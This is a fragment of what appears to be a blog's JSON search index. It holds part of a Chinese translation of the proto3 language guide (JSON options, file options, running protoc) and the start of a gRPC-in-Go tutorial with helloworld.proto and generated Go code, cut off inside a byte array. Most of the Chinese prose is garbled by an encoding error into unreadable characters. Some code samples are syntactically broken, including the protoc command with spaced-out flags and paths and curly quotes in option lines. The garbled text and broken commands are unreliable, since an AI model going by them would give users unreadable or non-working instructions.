ä»»ä½•JSONå¯¹è±¡ã€‚è§ã€‚`struct.proto`                             |\n| Wrapper types          | various types | `2, \"2\", \"foo\", true,\"true\", null, 0, â€¦` | åŒ…è£…å™¨åœ¨JSONä¸­ä½¿ç”¨ä¸åŒ…è£…åŸºå…ƒç±»å‹ç›¸åŒçš„è¡¨ç¤ºå½¢å¼ï¼Œé™¤äº†`null`åœ¨æ•°æ®è½¬æ¢å’Œä¼ è¾“æœŸé—´å…è®¸å’Œä¿ç•™çš„è¡¨ç¤ºå½¢å¼ã€‚ |\n| FieldMask              | string        | `\"f.fooBar,h\"`                           | è§ã€‚`field_mask.proto`                                       |\n| ListValue              | array         | `[foo, bar, â€¦]`                          |                                                              |\n| Value                  | value         |                                          | ä»»ä½•JSONå€¼                                                   |\n| NullValue              | null          |                                          | JSON null                                                    |\n\n##### 13.1 JSONé€‰é¡¹\n\nproto3  JSONå®ç°å¯ä»¥æä¾›ä»¥ä¸‹é€‰é¡¹ï¼š\n\n- **ä½¿ç”¨é»˜è®¤å€¼å‘å‡ºå­—æ®µ**ï¼šé»˜è®¤æƒ…å†µä¸‹ï¼Œproto3 JSONè¾“å‡ºä¸­çœç•¥äº†**å…·æœ‰é»˜è®¤å€¼çš„**å­—æ®µã€‚å®ç°å¯ä»¥æä¾›è¦†ç›–æ­¤è¡Œä¸ºçš„é€‰é¡¹ï¼Œå¹¶ä½¿ç”¨å…¶é»˜è®¤å€¼è¾“å‡ºå­—æ®µã€‚\n- **å¿½ç•¥æœªçŸ¥å­—æ®µ**ï¼šé»˜è®¤æƒ…å†µä¸‹ï¼ŒProto3 JSONè§£æå™¨åº”æ‹’ç»æœªçŸ¥å­—æ®µï¼Œä½†å¯ä»¥æä¾›å¿½ç•¥è§£æä¸­æœªçŸ¥å­—æ®µçš„é€‰é¡¹ã€‚\n- **ä½¿ç”¨protoå­—æ®µåç§°è€Œä¸æ˜¯å°å†™é©¼å³°åç§°**ï¼šé»˜è®¤æƒ…å†µä¸‹ï¼Œproto3 JSONæ‰“å°æœºåº”å°†å­—æ®µåç§°è½¬æ¢ä¸ºå°å†™é©¼å³°å¹¶å°†å…¶ç”¨ä½œJSONåç§°ã€‚å®ç°å¯ä»¥æä¾›ä½¿ç”¨protoå­—æ®µåç§°ä½œä¸ºJSONåç§°çš„é€‰é¡¹ã€‚Proto3 JSONè§£æå™¨éœ€è¦æ¥å—è½¬æ¢åçš„å°å†™é©¼å³°åç§°å’Œprotoå­—æ®µåç§°ã€‚\n- **å°†æšä¸¾å€¼å‘é€ä¸ºæ•´æ•°è€Œä¸æ˜¯å­—ç¬¦ä¸²**ï¼šé»˜è®¤æƒ…å†µä¸‹ï¼Œåœ¨JSONè¾“å‡ºä¸­ä½¿ç”¨æšä¸¾å€¼çš„åç§°ã€‚å¯ä»¥æä¾›é€‰é¡¹ä»¥ä½¿ç”¨æšä¸¾å€¼çš„æ•°å€¼ã€‚\n\n### 14. é€‰é¡¹\n\n`.proto`æ–‡ä»¶ä¸­çš„å„ä¸ªå£°æ˜å¯ä»¥ä½¿ç”¨è®¸å¤š*é€‰é¡¹*è¿›è¡Œæ³¨é‡Šã€‚é€‰é¡¹ä¸ä¼šæ›´æ”¹å£°æ˜çš„æ•´ä½“å«ä¹‰ï¼Œä½†å¯èƒ½ä¼šå½±å“åœ¨ç‰¹å®šä¸Šä¸‹æ–‡ä¸­å¤„ç†å®ƒçš„æ–¹å¼ã€‚å¯ç”¨é€‰é¡¹çš„å®Œæ•´åˆ—è¡¨åœ¨ä¸­å®šä¹‰`google/protobuf/descriptor.proto`ã€‚\n\nä¸€äº›é€‰é¡¹æ˜¯æ–‡ä»¶çº§é€‰é¡¹ï¼Œè¿™æ„å‘³ç€å®ƒä»¬åº”è¯¥åœ¨é¡¶çº§èŒƒå›´å†…ç¼–å†™ï¼Œè€Œä¸æ˜¯åœ¨ä»»ä½•æ¶ˆæ¯ï¼Œæšä¸¾æˆ–æœåŠ¡å®šä¹‰ä¸­ã€‚ä¸€äº›é€‰é¡¹æ˜¯æ¶ˆæ¯çº§é€‰é¡¹ï¼Œè¿™æ„å‘³ç€å®ƒä»¬åº”è¯¥å†™åœ¨æ¶ˆæ¯å®šä¹‰ä¸­ã€‚ä¸€äº›é€‰é¡¹æ˜¯å­—æ®µçº§é€‰é¡¹ï¼Œè¿™æ„å‘³ç€å®ƒä»¬åº”è¯¥å†™åœ¨å­—æ®µå®šä¹‰ä¸­ã€‚é€‰é¡¹ä¹Ÿå¯ä»¥å†™åœ¨æšä¸¾ç±»å‹ï¼Œæšä¸¾å€¼ï¼ŒæœåŠ¡ç±»å‹å’ŒæœåŠ¡æ–¹æ³•ä¸Š; ä½†æ˜¯ï¼Œç›®å‰æ²¡æœ‰ä»»ä½•æœ‰ç”¨çš„é€‰æ‹©ã€‚\n\nä»¥ä¸‹æ˜¯ä¸€äº›æœ€å¸¸ç”¨çš„é€‰é¡¹ï¼š\n\n- `java_package`ï¼ˆæ–‡ä»¶é€‰é¡¹ï¼‰ï¼šç”¨äºç”Ÿæˆçš„Javaç±»çš„åŒ…ã€‚å¦‚æœ`.proto`æ–‡ä»¶ä¸­æ²¡æœ‰ç»™å‡ºæ˜¾å¼é€‰é¡¹`java_package`ï¼Œåˆ™é»˜è®¤æƒ…å†µä¸‹å°†ä½¿ç”¨protoåŒ…ï¼ˆä½¿ç”¨æ–‡ä»¶ä¸­çš„â€œpackageâ€å…³é”®å­—æŒ‡å®š  .proto  ï¼‰ã€‚ä½†æ˜¯ï¼ŒprotoåŒ…é€šå¸¸ä¸èƒ½ç”Ÿæˆå¥½çš„JavaåŒ…ï¼Œå› ä¸ºprotoåŒ…ä¸ä¼šä»¥åå‘åŸŸåå¼€å¤´ã€‚å¦‚æœä¸ç”ŸæˆJavaä»£ç ï¼Œåˆ™æ­¤é€‰é¡¹æ— æ•ˆã€‚\n\n  ```protobuf\n  option java_package =â€œcom.example.fooâ€;\n  ```\n  \n- `java_multiple_files` ï¼ˆæ–‡ä»¶é€‰é¡¹ï¼‰ï¼šå¯¼è‡´åœ¨åŒ…çº§åˆ«å®šä¹‰é¡¶çº§æ¶ˆæ¯ï¼Œæšä¸¾å’ŒæœåŠ¡ï¼Œè€Œä¸æ˜¯åœ¨.protoæ–‡ä»¶ä¹‹åå‘½åçš„å¤–éƒ¨ç±»ä¸­ã€‚\n\n```protobuf\noption java_multiple_files = true;\n```\n\n- `java_outer_classname`ï¼ˆfile optionï¼‰ï¼šè¦ç”Ÿæˆçš„æœ€å¤–å±‚Javaç±»ï¼ˆä»¥åŠæ–‡ä»¶åï¼‰çš„ç±»åã€‚å¦‚æœ  `.proto`æ–‡ä»¶ä¸­æ²¡æœ‰æŒ‡å®š `java_outer_classname`ï¼Œåˆ™é€šè¿‡å°†`.proto`æ–‡ä»¶åè½¬æ¢ä¸ºé©¼å³°æ ¼å¼ï¼ˆå› æ­¤ `foo_bar.proto` æˆä¸º`FooBar.java`ï¼‰æ¥æ„é€ ç±»åã€‚å¦‚æœä¸ç”ŸæˆJavaä»£ç ï¼Œåˆ™æ­¤é€‰é¡¹æ— æ•ˆã€‚\n\n```protobuf\n  option java_outer_classname =â€œPonycopterâ€;\n\n```\n\n- `optimize_for`\n\n  ï¼ˆæ–‡ä»¶é€‰é¡¹ï¼‰ï¼šå¯ä»¥è®¾ç½®ä¸º`SPEED`ï¼Œ`CODE_SIZE`æˆ–`LITE_RUNTIME`ã€‚è¿™ä¼šä»¥ä¸‹åˆ—æ–¹å¼å½±å“C ++å’ŒJavaä»£ç ç”Ÿæˆå™¨ï¼ˆå¯èƒ½è¿˜æœ‰ç¬¬ä¸‰æ–¹ç”Ÿæˆå™¨ï¼‰ï¼š\n\n  - `SPEED`ï¼ˆé»˜è®¤å€¼ï¼‰ï¼šprotobuf ç¼–è¯‘å™¨å°†ç”Ÿæˆç”¨äºå¯¹æ¶ˆæ¯ç±»å‹è¿›è¡Œåºåˆ—åŒ–ï¼Œè§£æå’Œæ‰§è¡Œå…¶ä»–å¸¸è§æ“ä½œçš„ä»£ç ã€‚æ­¤ä»£ç ç»è¿‡é«˜åº¦ä¼˜åŒ–ã€‚\n  - `CODE_SIZE`ï¼šprotobuf ç¼–è¯‘å™¨å°†ç”Ÿæˆæœ€å°‘çš„ç±»ï¼Œå¹¶ä¾èµ–äºåŸºäºåå°„çš„å…±äº«ä»£ç æ¥å®ç°åºåˆ—åŒ–ï¼Œè§£æå’Œå„ç§å…¶ä»–æ“ä½œã€‚å› æ­¤ç”Ÿæˆçš„ä»£ç æ¯”ä½¿ç”¨`SPEED`å°å¾—å¤šï¼Œä½†æ“ä½œä¼šæ›´æ…¢ã€‚ç±»ä»å°†å®ç°ä¸`SPEED`æ¨¡å¼å®Œå…¨ç›¸åŒçš„å…¬å…±API ã€‚æ­¤æ¨¡å¼åœ¨åŒ…å«éå¸¸å¤§æ•°é‡çš„`.proto`æ–‡ä»¶çš„åº”ç”¨ç¨‹åºä¸­æœ€æœ‰ç”¨ï¼Œå¹¶ä¸”ä¸éœ€è¦æ‰€æœ‰æ–‡ä»¶éƒ½éå¸¸å¿«é€Ÿã€‚\n  - `LITE_RUNTIME`ï¼šprotobuf ç¼–è¯‘å™¨å°†ç”Ÿæˆä»…ä¾èµ–äºâ€œliteâ€è¿è¡Œæ—¶åº“ï¼ˆ`libprotobuf-lite`è€Œä¸æ˜¯`libprotobuf`ï¼‰çš„ç±»ã€‚ç²¾ç®€ç‰ˆè¿è¡Œæ—¶æ¯”æ•´ä¸ªåº“å°å¾—å¤šï¼ˆå¤§çº¦å°ä¸€ä¸ªæ•°é‡çº§ï¼‰ï¼Œä½†çœç•¥äº†æè¿°ç¬¦å’Œåå°„ç­‰ç‰¹å®šåŠŸèƒ½ã€‚è¿™å¯¹äºåœ¨ç§»åŠ¨ç”µè¯ç­‰å—é™å¹³å°ä¸Šè¿è¡Œçš„åº”ç”¨ç¨‹åºå°¤å…¶æœ‰ç”¨ã€‚ç¼–è¯‘å™¨ä»ç„¶ä¼šåƒåœ¨`SPEED`æ¨¡å¼ä¸­ä¸€æ ·ç”Ÿæˆæ‰€æœ‰æ–¹æ³•çš„å¿«é€Ÿå®ç°ã€‚ç”Ÿæˆçš„ç±»å°†ä»…å®ç°`MessageLite`æ¯ç§è¯­è¨€çš„æ¥å£ï¼Œè¯¥æ¥å£ä»…æä¾›å®Œæ•´`Message`æ¥å£çš„æ–¹æ³•çš„å­é›†ã€‚\n\n  ```protobuf\n  option optimize_for = CODE_SIZE;\n  ```\n  \n- `cc_enable_arenas`ï¼ˆæ–‡ä»¶é€‰é¡¹ï¼‰ï¼šä¸ºC ++ç”Ÿæˆçš„ä»£ç å¯ç”¨[ç«æŠ€åœºåˆ†é…](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Farenas)ã€‚\n\n- `objc_class_prefix`ï¼ˆæ–‡ä»¶é€‰é¡¹ï¼‰ï¼šè®¾ç½®Objective-Cç±»å‰ç¼€ï¼Œè¯¥å‰ç¼€é¢„å…ˆæ·»åŠ åˆ°æ­¤.protoçš„æ‰€æœ‰Objective-Cç”Ÿæˆçš„ç±»å’Œæšä¸¾ä¸­ã€‚æ²¡æœ‰é»˜è®¤å€¼ã€‚æ‚¨åº”è¯¥ä½¿ç”¨[Appleå»ºè®®çš„](https://link.juejin.im?target=https%3A%2F%2Fdeveloper.apple.com%2Flibrary%2Fios%2Fdocumentation%2FCocoa%2FConceptual%2FProgrammingWithObjectiveC%2FConventions%2FConventions.html%23%2F%2Fapple_ref%2Fdoc%2Fuid%2FTP40011210-CH10-SW4) 3-5ä¸ªå¤§å†™å­—ç¬¦ä¹‹é—´çš„å‰ç¼€ã€‚è¯·æ³¨æ„ï¼ŒAppleä¿ç•™æ‰€æœ‰2ä¸ªå­—æ¯çš„å‰ç¼€ã€‚\n\n- `deprecated`ï¼ˆå­—æ®µé€‰é¡¹ï¼‰ï¼šå¦‚æœè®¾ç½®ä¸º`true`ï¼Œåˆ™è¡¨ç¤ºè¯¥å­—æ®µå·²å¼ƒç”¨ï¼Œæ–°ä»£ç ä¸åº”ä½¿ç”¨è¯¥å­—æ®µã€‚åœ¨å¤§å¤šæ•°è¯­è¨€ä¸­ï¼Œè¿™æ²¡æœ‰å®é™…æ•ˆæœã€‚åœ¨Javaä¸­ï¼Œè¿™æˆä¸ºä¸€ä¸ª`@Deprecated`æ³¨é‡Šã€‚å°†æ¥ï¼Œå…¶ä»–ç‰¹å®šäºè¯­è¨€çš„ä»£ç ç”Ÿæˆå™¨å¯èƒ½ä¼šåœ¨å­—æ®µçš„è®¿é—®å™¨ä¸Šç”Ÿæˆå¼ƒç”¨æ³¨é‡Šï¼Œè¿™å°†å¯¼è‡´åœ¨ç¼–è¯‘å°è¯•ä½¿ç”¨è¯¥å­—æ®µçš„ä»£ç æ—¶å‘å‡ºè­¦å‘Šã€‚å¦‚æœä»»ä½•äººéƒ½æ²¡æœ‰ä½¿ç”¨è¯¥å­—æ®µï¼Œå¹¶ä¸”æ‚¨å¸Œæœ›é˜»æ­¢æ–°ç”¨æˆ·ä½¿ç”¨è¯¥å­—æ®µï¼Œè¯·è€ƒè™‘ä½¿ç”¨ä¿ç•™è¯­å¥æ›¿æ¢å­—æ®µå£°æ˜ã€‚\n\n  ```protobuf\n  int32 old_field = 6 [deprecated = true];\n  ```\n\n##### 14.1 è‡ªå®šä¹‰é€‰é¡¹\n\nProtocol Buffersè¿˜å…è®¸æ‚¨å®šä¹‰å’Œä½¿ç”¨è‡ªå·±çš„é€‰é¡¹ã€‚è¿™æ˜¯å¤§å¤šæ•°äººä¸éœ€è¦çš„**é«˜çº§åŠŸèƒ½**ã€‚å¦‚æœæ‚¨ç¡®å®è®¤ä¸ºéœ€è¦åˆ›å»ºè‡ªå·±çš„é€‰é¡¹ï¼Œè¯·å‚é˜…[Proto2è¯­è¨€æŒ‡å—](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto.html%23customoptions)ä»¥è·å–è¯¦ç»†ä¿¡æ¯ã€‚è¯·æ³¨æ„ï¼Œåˆ›å»ºè‡ªå®šä¹‰é€‰é¡¹ä½¿ç”¨çš„[æ‰©å±•å](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto.html%23extensions)ä»…å…è®¸ç”¨äºproto3ä¸­çš„è‡ªå®šä¹‰é€‰é¡¹ã€‚\n\n### 15. ç”Ÿæˆæ‚¨çš„ç±»\n\næ ¹æ®å®é™…å·¥ä½œéœ€è¦ï¼Œç”Ÿæˆä»¥ä¸‹å¯¹åº”è¯­è¨€çš„è‡ªå®šä¹‰æ¶ˆæ¯ç±»å‹Javaï¼ŒPythonï¼ŒC ++ï¼ŒGo, Ruby, Objective-Cï¼Œæˆ–Cï¼ƒçš„`.proto`æ–‡ä»¶ï¼Œä½ éœ€è¦è¿è¡Œprotobuf ç¼–è¯‘å™¨`protoc`ä¸Š`.proto`ã€‚å¦‚æœå°šæœªå®‰è£…ç¼–è¯‘å™¨ï¼Œè¯·[ä¸‹è½½è¯¥è½¯ä»¶åŒ…](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fdownloads.html)å¹¶æŒ‰ç…§è‡ªè¿°æ–‡ä»¶ä¸­çš„è¯´æ˜è¿›è¡Œæ“ä½œã€‚å¯¹äºGoï¼Œæ‚¨è¿˜éœ€è¦ä¸ºç¼–è¯‘å™¨å®‰è£…ä¸€ä¸ªç‰¹æ®Šçš„ä»£ç ç”Ÿæˆå™¨æ’ä»¶ï¼šæ‚¨å¯ä»¥åœ¨GitHubä¸Šçš„[golang / protobuf](https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fgolang%2Fprotobuf%2F)å­˜å‚¨åº“ä¸­æ‰¾åˆ°è¿™ä¸ªå’Œå®‰è£…è¯´æ˜ã€‚\n\nProtobuf ç¼–è¯‘å™¨çš„è°ƒç”¨å¦‚ä¸‹ï¼š\n\n```protobuf\nprotoc --proto_path = IMPORT_PATH --cpp_out = DST_DIR --java_out = DST_DIR --python_out = DST_DIR --go_out = DST_DIR --ruby_out = DST_DIR --objc_out = DST_DIR --csharp_out = DST_DIR  path / to / file .proto\n```\n\n- `IMPORT_PATH`æŒ‡å®š`.proto`è§£æ`import`æŒ‡ä»¤æ—¶åœ¨å…¶ä¸­æŸ¥æ‰¾æ–‡ä»¶çš„ç›®å½•ã€‚å¦‚æœçœç•¥ï¼Œåˆ™ä½¿ç”¨å½“å‰ç›®å½•ã€‚å¯ä»¥é€šè¿‡`--proto_path`å¤šæ¬¡ä¼ é€’é€‰é¡¹æ¥æŒ‡å®šå¤šä¸ªå¯¼å…¥ç›®å½•; ä»–ä»¬å°†æŒ‰é¡ºåºæœç´¢ã€‚ å¯ä»¥ç”¨ä½œç®€çŸ­çš„å½¢å¼ã€‚ `-I=*IMPORT_PATH*``--proto_path`\n\n- æ‚¨å¯ä»¥æä¾›ä¸€ä¸ªæˆ–å¤šä¸ªè¾“å‡ºæŒ‡ä»¤ï¼š\n\n  - `--cpp_out`ç”ŸæˆC ++ä»£ç `DST_DIR`ã€‚æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…[C ++ç”Ÿæˆçš„ä»£ç å‚è€ƒ](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Fcpp-generated)ã€‚\n  - `--java_out`ç”ŸæˆJavaä»£ç `DST_DIR`ã€‚è¯·å‚é˜…[çš„Javaç”Ÿæˆçš„ä»£ç å‚è€ƒ](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Fjava-generated)æ›´å¤šã€‚\n  - `--python_out`ç”ŸæˆPythonä»£ç `DST_DIR`ã€‚çœ‹åˆ°[çš„Pythonç”Ÿæˆçš„ä»£ç çš„å‚è€ƒ](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Fpython-generated)æ›´å¤šã€‚\n  - `--go_out`ç”ŸæˆGoä»£ç `DST_DIR`ã€‚æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…[Goç”Ÿæˆä»£ç å‚è€ƒ](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Fgo-generated)ã€‚\n  - `--ruby_out`ç”ŸæˆRubyä»£ç `DST_DIR`ã€‚Rubyç”Ÿæˆçš„ä»£ç å‚è€ƒå³å°†æ¨å‡ºï¼\n  - `--objc_out`ç”ŸæˆObjective-Cä»£ç `DST_DIR`ã€‚æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…[Objective-Cç”Ÿæˆçš„ä»£ç å‚è€ƒ](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Fobjective-c-generated)ã€‚\n  - `--csharp_out`ç”ŸæˆCï¼ƒä»£ç `DST_DIR`ã€‚æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…[Cï¼ƒç”Ÿæˆçš„ä»£ç å‚è€ƒ](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Fcsharp-generated)ã€‚\n  - `--php_out`ç”ŸæˆPHPä»£ç `DST_DIR`ã€‚çœ‹åˆ°[PHPç”Ÿæˆçš„ä»£ç çš„å‚è€ƒ](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Fphp-generated)æ›´å¤šã€‚\n\n  ä¸ºäº†æ–¹ä¾¿èµ·è§ï¼Œå¦‚æœDST_DIRç»“æŸäº`.zip`æˆ–.`jar`ï¼Œç¼–è¯‘å™¨ä¼šå°†è¾“å‡ºå†™å…¥å…·æœ‰ç»™å®šåç§°çš„å•ä¸ªZIPæ ¼å¼å­˜æ¡£æ–‡ä»¶ã€‚`.jar`è¾“å‡ºè¿˜å°†æ ¹æ®Java JARè§„èŒƒçš„è¦æ±‚æä¾›æ¸…å•æ–‡ä»¶ã€‚è¯·æ³¨æ„ï¼Œå¦‚æœè¾“å‡ºå­˜æ¡£å·²å­˜åœ¨ï¼Œåˆ™ä¼šè¢«è¦†ç›–; ç¼–è¯‘å™¨ä¸å¤Ÿæ™ºèƒ½ï¼Œæ— æ³•å°†æ–‡ä»¶æ·»åŠ åˆ°ç°æœ‰å­˜æ¡£ä¸­ã€‚\n\n- æ‚¨å¿…é¡»æä¾›ä¸€ä¸ªæˆ–å¤šä¸ª`.proto`æ–‡ä»¶ä½œä¸ºè¾“å…¥ã€‚`.proto`å¯ä»¥ä¸€æ¬¡æŒ‡å®šå¤šä¸ªæ–‡ä»¶ã€‚è™½ç„¶æ–‡ä»¶æ˜¯ç›¸å¯¹äºå½“å‰ç›®å½•å‘½åçš„ï¼Œä½†æ¯ä¸ªæ–‡ä»¶å¿…é¡»ä½äºå…¶ä¸­ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œ`IMPORT_PATH`ä»¥ä¾¿ç¼–è¯‘å™¨å¯ä»¥ç¡®å®šå…¶è§„èŒƒåç§°ã€‚\n\n\n\n### å‚è€ƒèµ„æ–™:\n\n+ https://juejin.im/post/5bb597c2e51d450e6e03e42d\n+ https://colobu.com/2017/03/16/Protobuf3-language-guide/","tags":["protobuf"],"categories":["è®¡ç®—æœºåŸºç¡€"]},{"title":"grpcåœ¨golang_cpp_pythonä¸‹çš„å®è·µ","url":"%2Fp%2Fc0435795.html","content":"\n\n\n### 1. ä¸‹è½½protocbuf ç”Ÿæˆå™¨\n\nhttps://github.com/protocolbuffers/protobuf/releases\n\nä¾‹å¦‚æˆ‘ä¸‹è½½çš„æ˜¯ [protoc-3.9.0-osx-x86_64.zip](https://github.com/protocolbuffers/protobuf/releases/download/v3.9.0/protoc-3.9.0-osx-x86_64.zip)\n\n```bash\ncd protoc-3.9.0-osx-x86_64 \ncp -r include/ /usr/local/include/ \ncp -r bin/ /usr/local/bin/\nprotoc --version\n```\n\n<!-- more -->\n\n### 2. golangç‰ˆæœ¬\n\n```bash\ngo get -u google.golang.org/grpc\ngo get -u github.com/golang/protobuf/protoc-gen-go\n```\n\næˆ‘ä»¬å» `$GOPATH/src/google.golang.org/grpc/examples` çœ‹helloworldä¾‹å­\n\n```bash\ncd $GOPATH/src/google.golang.org/grpc/examples/helloworld\n```\n\n\n\n>  helloworld.proto\n\n```protobuf\nsyntax = \"proto3\";\n\noption java_multiple_files = true;\noption java_package = \"io.grpc.examples.helloworld\";\noption java_outer_classname = \"HelloWorldProto\";\n\npackage helloworld;\n\n// The greeting service definition.\nservice Greeter {\n  // Sends a greeting\n  rpc SayHello (HelloRequest) returns (HelloReply) {}\n}\n\n// The request message containing the user's name.\nmessage HelloRequest {\n  string name = 1;\n}\n\n// The response message containing the greetings\nmessage HelloReply {\n  string message = 1;\n}\n```\n\næˆ‘ä»¬é€šè¿‡.protoæ–‡ä»¶ç”Ÿæˆgolangæ–‡ä»¶, ç”Ÿæˆåçš„æ–‡ä»¶ä¸è¦ç¼–è¾‘.\n\n```sh\nprotoc -I helloworld/ helloworld/helloworld.proto --go_out=plugins=grpc:helloworld\n\n# è·å–è¿›å…¥åˆ°helloworldç›®å½•é‡Œ\nprotoc helloworld.proto --go_out=plugins=grpc:. \n```\n\n\n\n> helloworld.pb.go\n\n```go\n// Code generated by protoc-gen-go. DO NOT EDIT.\n// source: helloworld.proto\n\npackage helloworld\n\nimport (\n\tcontext \"context\"\n\tfmt \"fmt\"\n\tproto \"github.com/golang/protobuf/proto\"\n\tgrpc \"google.golang.org/grpc\"\n\tcodes \"google.golang.org/grpc/codes\"\n\tstatus \"google.golang.org/grpc/status\"\n\tmath \"math\"\n)\n\n// Reference imports to suppress errors if they are not otherwise used.\nvar _ = proto.Marshal\nvar _ = fmt.Errorf\nvar _ = math.Inf\n\n// This is a compile-time assertion to ensure that this generated file\n// is compatible with the proto package it is being compiled against.\n// A compilation error at this line likely means your copy of the\n// proto package needs to be updated.\nconst _ = proto.ProtoPackageIsVersion3 // please upgrade the proto package\n\n// The request message containing the user's name.\ntype HelloRequest struct {\n\tName                 string   `protobuf:\"bytes,1,opt,name=name,proto3\" json:\"name,omitempty\"`\n\tXXX_NoUnkeyedLiteral struct{} `json:\"-\"`\n\tXXX_unrecognized     []byte   `json:\"-\"`\n\tXXX_sizecache        int32    `json:\"-\"`\n}\n\nfunc (m *HelloRequest) Reset()         { *m = HelloRequest{} }\nfunc (m *HelloRequest) String() string { return proto.CompactTextString(m) }\nfunc (*HelloRequest) ProtoMessage()    {}\nfunc (*HelloRequest) Descriptor() ([]byte, []int) {\n\treturn fileDescriptor_17b8c58d586b62f2, []int{0}\n}\n\nfunc (m *HelloRequest) XXX_Unmarshal(b []byte) error {\n\treturn xxx_messageInfo_HelloRequest.Unmarshal(m, b)\n}\nfunc (m *HelloRequest) XXX_Marshal(b []byte, deterministic bool) ([]byte, error) {\n\treturn xxx_messageInfo_HelloRequest.Marshal(b, m, deterministic)\n}\nfunc (m *HelloRequest) XXX_Merge(src proto.Message) {\n\txxx_messageInfo_HelloRequest.Merge(m, src)\n}\nfunc (m *HelloRequest) XXX_Size() int {\n\treturn xxx_messageInfo_HelloRequest.Size(m)\n}\nfunc (m *HelloRequest) XXX_DiscardUnknown() {\n\txxx_messageInfo_HelloRequest.DiscardUnknown(m)\n}\n\nvar xxx_messageInfo_HelloRequest proto.InternalMessageInfo\n\nfunc (m *HelloRequest) GetName() string {\n\tif m != nil {\n\t\treturn m.Name\n\t}\n\treturn \"\"\n}\n\n// The response message containing the greetings\ntype HelloReply struct {\n\tMessage              string   `protobuf:\"bytes,1,opt,name=message,proto3\" json:\"message,omitempty\"`\n\tXXX_NoUnkeyedLiteral struct{} `json:\"-\"`\n\tXXX_unrecognized     []byte   `json:\"-\"`\n\tXXX_sizecache        int32    `json:\"-\"`\n}\n\nfunc (m *HelloReply) Reset()         { *m = HelloReply{} }\nfunc (m *HelloReply) String() string { return proto.CompactTextString(m) }\nfunc (*HelloReply) ProtoMessage()    {}\nfunc (*HelloReply) Descriptor() ([]byte, []int) {\n\treturn fileDescriptor_17b8c58d586b62f2, []int{1}\n}\n\nfunc (m *HelloReply) XXX_Unmarshal(b []byte) error {\n\treturn xxx_messageInfo_HelloReply.Unmarshal(m, b)\n}\nfunc (m *HelloReply) XXX_Marshal(b []byte, deterministic bool) ([]byte, error) {\n\treturn xxx_messageInfo_HelloReply.Marshal(b, m, deterministic)\n}\nfunc (m *HelloReply) XXX_Merge(src proto.Message) {\n\txxx_messageInfo_HelloReply.Merge(m, src)\n}\nfunc (m *HelloReply) XXX_Size() int {\n\treturn xxx_messageInfo_HelloReply.Size(m)\n}\nfunc (m *HelloReply) XXX_DiscardUnknown() {\n\txxx_messageInfo_HelloReply.DiscardUnknown(m)\n}\n\nvar xxx_messageInfo_HelloReply proto.InternalMessageInfo\n\nfunc (m *HelloReply) GetMessage() string {\n\tif m != nil {\n\t\treturn m.Message\n\t}\n\treturn \"\"\n}\n\nfunc init() {\n\tproto.RegisterType((*HelloRequest)(nil), \"helloworld.HelloRequest\")\n\tproto.RegisterType((*HelloReply)(nil), \"helloworld.HelloReply\")\n}\n\nfunc init() { proto.RegisterFile(\"helloworld.proto\", fileDescriptor_17b8c58d586b62f2) }\n\nvar fileDescriptor_17b8c58d586b62f2 = []byte{\n\t// 175 bytes of a gzipped FileDescriptorProto\n\t0x1f, 0x8b, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0xff, 0xe2, 0x12, 0xc8, 0x48, 0xcd, 0xc9,\n\t0xc9, 0x2f, 0xcf, 0x2f, 0xca, 0x49, 0xd1, 0x2b, 0x28, 0xca, 0x2f, 0xc9, 0x17, 0xe2, 0x42, 0x88,\n\t0x28, 0x29, 0x71, 0xf1, 0x78, 0x80, 0x78, 0x41, 0xa9, 0x85, 0xa5, 0xa9, 0xc5, 0x25, 0x42, 0x42,\n\t0x5c, 0x2c, 0x79, 0x89, 0xb9, 0xa9, 0x12, 0x8c, 0x0a, 0x8c, 0x1a, 0x9c, 0x41, 0x60, 0xb6, 0x92,\n\t0x1a, 0x17, 0x17, 0x54, 0x4d, 0x41, 0x4e, 0xa5, 0x90, 0x04, 0x17, 0x7b, 0x6e, 0x6a, 0x71, 0x71,\n\t0x62, 0x3a, 0x4c, 0x11, 0x8c, 0x6b, 0xe4, 0xc9, 0xc5, 0xee, 0x5e, 0x94, 0x9a, 0x5a, 0x92, 0x5a,\n\t0x24, 0x64, 0xc7, 0xc5, 0x11, 0x9c, 0x58, 0x09, 0xd6, 0x25, 0x24, 0xa1, 0x87, 0xe4, 0x02, 0x64,\n\t0xcb, 0xa4, 0xc4, 0xb0, 0xc8, 0x14, 0xe4, 0x54, 0x2a, 0x31, 0x38, 0x19, 0x70, 0x49, 0x67, 0xe6,\n\t0xeb, 0xa5, 0x17, 0x15, 0x24, 0xeb, 0xa5, 0x56, 0x24, 0xe6, 0x16, 0xe4, 0xa4, 0x16, 0x23, 0xa9,\n\t0x75, 0xe2, 0x07, 0x2b, 0x0e, 0x07, 0xb1, 0x03, 0x40, 0x5e, 0x0a, 0x60, 0x4c, 0x62, 0x03, 0xfb,\n\t0xcd, 0x18, 0x10, 0x00, 0x00, 0xff, 0xff, 0x0f, 0xb7, 0xcd, 0xf2, 0xef, 